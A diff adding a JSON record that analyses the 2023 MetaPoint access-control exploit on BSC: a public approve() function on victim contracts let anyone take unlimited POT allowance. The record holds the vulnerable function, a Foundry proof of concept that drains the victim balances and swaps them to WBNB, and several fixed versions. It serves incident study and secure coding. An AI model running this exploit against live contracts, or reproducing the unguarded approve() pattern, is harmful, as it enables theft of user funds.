@@ -1,0 +1,42 @@
+{
+ "id": "2023__2023-04-11_MetaPoint_AccessControl_BSC",
+ "source_file": "2023/2023-04-11_MetaPoint_AccessControl_BSC.md",
+ "title": "MetaPoint — Access Control Vulnerability (Unrestricted approve Function) Analysis",
+ "date": "2023-04-11",
+ "protocol": "MetaPoint",
+ "chain": "BSC",
+ "loss_raw": "$820,000",
+ "loss_usd": 820000.0,
+ "root_cause": "Missing access control on victim contract's `approve()` function — anyone can call it to set unlimited allowance",
+ "attack_tx": "Block 27,264,384",
+ "vulnerable_contract": "0x3B5E...BEa86 (POT Token)",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable: No access control modifier whatsoever — anyone can call\n// Calling this function grants msg.sender (attacker) unlimited rights over pot token\nfunction approve() external {\n    // No access control of any kind: no onlyOwner, no msg.sender check, etc.\n    // Grants the caller (attacker) unlimited spending rights over POT tokens\n    IERC20(pot).approve(msg.sender, type(uint256).max);\n}",
+  "// Excerpt from PoC: drain full balance from each victim\nfor (uint256 i = 0; i < victims.length; i++) {\n    uint256 amount = IERC20(pot).balanceOf(victims[i]);\n    if (amount == 0) {\n        continue; // skip if no balance\n    }\n    // ❌ Unlimited allowance already obtained via approve() — full drain possible\n    IERC20(pot).transferFrom(victims[i], address(this), amount);\n}",
+  "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\n// [Step 0] Interface definition: approve() function signature of victim contracts\ninterface IApprove {\n    function approve() external; // ❌ Dangerous function with no access control\n}\n\ncontract ContractTest is Test {\n    address pot = 0x3B5E381130673F794a5CF67FBbA48688386BEa86;     // POT token\n    address usdt = 0x55d398326f99059fF775485246999027B3197955;    // BSC USDT\n    address pot_usdt_pool = 0x9117df9aA33B23c0A9C2C913aD0739273c3930b3; // LP pool\n    address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;   // WBNB\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E); // PancakeSwap\n\n    function setUp() public {\n        // Fork BSC mainnet at block 27,264,383 (block immediately before attack)\n        vm.createSelectFork(\"bsc\", 27_264_384 - 1);\n    }\n\n    function testExploit() public {\n        // [Step 1] List of 11 victim contracts with vulnerable approve()\n        address[11] memory victims = [\n            0x724DbEA8A0ec7070de448ef4AF3b95210BDC8DF6,\n            0xE5cBd18Db5C1930c0A07696eC908f20626a55E3C,\n            // ... (11 total)\n            0x52AeD741B5007B4fb66860b5B31dD4c542D65785\n        ];\n\n        // [Step 2] Call approve() on each victim → grants attacker unlimited allowance\n        for (uint256 i = 0; i < victims.length; i++) {\n            IApprove(victims[i]).approve(); // ❌ Vulnerable function callable by anyone\n        }\n\n        // [Step 3] Drain full victim balance via transferFrom\n        for (uint256 i = 0; i < victims.length; i++) {\n            uint256 amount = IERC20(pot).balanceOf(victims[i]);\n            if (amount == 0) continue;\n            IERC20(pot).transferFrom(victims[i], address(this), amount);\n        }\n\n        // [Step 4] Liquidate POT → USDT → WBNB (PancakeSwap V2)\n        bscSwap(pot, usdt, IERC20(pot).balanceOf(address(this)));\n        bscSwap(usdt, wbnb, IERC20(usdt).balanceOf(address(this)));\n\n        uint256 wbnbBalance = IERC20(wbnb).balanceOf(address(this));\n        emit log_named_decimal_uint(\"[After Attack] Attacker WBNB Balance\", wbnbBalance, 18);\n    }\n\n    // PancakeSwap V2 swap helper\n    function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {\n        IERC20(tokenFrom).approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = tokenFrom;\n        path[1] = tokenTo;\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            amount, 0, path, address(this), block.timestamp\n        );\n    }\n}"
+ ],
+ "code_after": [
+  "// ✅ Fixed: Only authorized addresses can call approve\n// Method 1: Add onlyOwner modifier\nfunction approve() external onlyOwner {\n    // Only the deployer (owner) can set allowances\n    IERC20(pot).approve(msg.sender, type(uint256).max);\n}\n\n// ✅ Better approach: Remove the approve function entirely and manage allowances explicitly\n// Method 2: Allow only a specific trusted contract\naddress public trustedSpender;\n\nfunction setApproval(address spender, uint256 amount) external onlyOwner {\n    require(spender == trustedSpender, \"Unauthorized spender\");\n    IERC20(pot).approve(spender, amount);\n}",
+  "// ✅ Method 1: Add onlyOwner modifier (minimal fix)\nfunction approve() external onlyOwner {\n    IERC20(pot).approve(msg.sender, type(uint256).max);\n}\n\n// ✅ Method 2: Remove approve() entirely and manage allowances explicitly\n// Split into a separate function with explicit spender and amount parameters\nfunction setTokenAllowance(\n    address token,\n    address spender,\n    uint256 amount\n) external onlyOwner {\n    // Maintain a separate whitelist of trusted spenders\n    require(trustedSpenders[spender], \"Unauthorized spender\");\n    // Prohibit unlimited approvals (type(uint256).max)\n    require(amount <= MAX_APPROVAL_AMOUNT, \"Approval amount exceeds limit\");\n    IERC20(token).approve(spender, amount);\n}\n\n// ✅ Method 3: Remove approve() from the smart contract entirely\n// Instead, set allowances only at deployment or initialization\nconstructor(address _pot, address _router) {\n    // Approve trusted contract once at deployment\n    IERC20(_pot).approve(_router, type(uint256).max);\n}"
+ ],
+ "steps": [
+  "Step 1: Batch approve() calls (11 victims)",
+  "Step 2: Drain all POT tokens",
+  "Step 3: Swap POT → USDT",
+  "Step 4: Swap USDT → WBNB",
+  "→ Grants attacker unlimited allowance",
+  "transferFrom(victim → attacker, amount)",
+  "→ Full victim balance transferred to",
+  "[Step 3] POT → USDT (PancakeSwap V2)",
+  "POT → USDT swap executed",
+  "[Step 4] USDT → WBNB (PancakeSwap V2)",
+  "USDT → WBNB swap executed"
+ ],
+ "other_code": [
+  "Step 1: Batch approve() calls (11 victims)\nStep 2: Drain all POT tokens\nStep 3: Swap POT → USDT\nStep 4: Swap USDT → WBNB",
+  "Attacker Contract\n        │\n        │  [Step 1] for i in victims[0..10]:\n        │           IApprove(victims[i]).approve()\n        │\n        ▼\n┌─────────────────────────────────────────────┐\n│   Victim Contracts (x11)                    │\n│   victims[0]: 0x724D...DF6                  │\n│   victims[1]: 0xE5cB...E3C                  │\n│   ...                                       │\n│   victims[10]: 0x52Ae...785                 │\n│                                             │\n│   approve() executes:                       │\n│   POT.approve(msg.sender, type(uint).max)   │\n│   → Grants attacker unlimited allowance     │\n└─────────────────────────────────────────────┘\n        │\n        │  [Step 2] for i in victims[0..10]:\n        │           POT.transferFrom(victims[i], attacker, balance)\n     "
+ ]
+}
